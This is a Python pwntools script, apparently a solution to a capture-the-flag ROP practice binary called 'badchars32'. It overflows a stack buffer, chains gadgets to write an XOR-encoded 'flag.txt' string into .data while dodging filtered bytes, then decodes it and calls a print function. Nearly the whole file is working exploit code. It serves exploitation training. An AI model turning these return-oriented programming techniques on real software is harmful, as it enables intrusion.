from pwn import *
from pwn import p32
import socket
from ctypes import *
context(arch='i386', os='linux', log_level='DEBUG')

# host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
# r = remote(ip,37506)#远程连接
# elf = cdll.LoadLibrary('./libwrite432.so')
r = process("./badchars32")

print_addr = 0x80483d0
mov_edi_esi = 0x0804854f
pop_esi_edi_ebp = 0x080485b9
xor_ebp_bl = 0x08048547
pop_ebx = 0x0804839d
pop_ebp = 0x080485bb
data_addr = 0x0804a018
flag_string = 'flag.txt'
badchar = ['x', 'g', 'a', '.']

xor_byte = 0x1

while 1:
    flag_xor = ""
    for i in flag_string:
        i_encode = ord(i) ^ xor_byte
        if chr(i_encode) in badchar:
            xor_byte += 1  #  保证异或后没有bad字符了
            break
        else:
            flag_xor += chr(i_encode)
    if len(flag_xor) == 8:
        break

# print(flag_xor,xor_byte)

payload = b'A' * 0x28 + b'junk'
payload += p32(pop_esi_edi_ebp) + flag_xor[:4].encode() + p32(data_addr) + p32(0) + p32(mov_edi_esi)
payload += p32(pop_esi_edi_ebp) + flag_xor[4:8].encode() + p32(data_addr+4) + p32(0) + p32(mov_edi_esi)
#存入到.data段

for i in range(len(flag_xor)):
    payload += p32(pop_ebp)
    payload += p32(data_addr + i)
    payload += p32(pop_ebx)
    payload += p32(xor_byte)
    payload += p32(xor_ebp_bl)
#在.data中解密

payload += p32(print_addr) + b'BBBB' + p32(data_addr)


pause()

r.sendlineafter(b">", payload)

r.interactive()
